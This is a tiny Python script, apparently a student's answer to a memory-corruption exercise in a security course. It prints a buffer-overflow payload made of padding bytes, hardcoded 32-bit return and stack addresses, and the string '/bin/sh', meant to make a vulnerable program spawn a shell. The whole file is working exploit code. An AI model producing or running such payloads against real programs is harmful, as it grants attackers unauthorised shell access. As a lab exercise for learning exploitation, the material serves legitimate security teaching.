#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x01'*(14) + b'\xad\x88\x04\x08' + b'\x68\xcb\xfe\xff' + b'/bin/sh\0')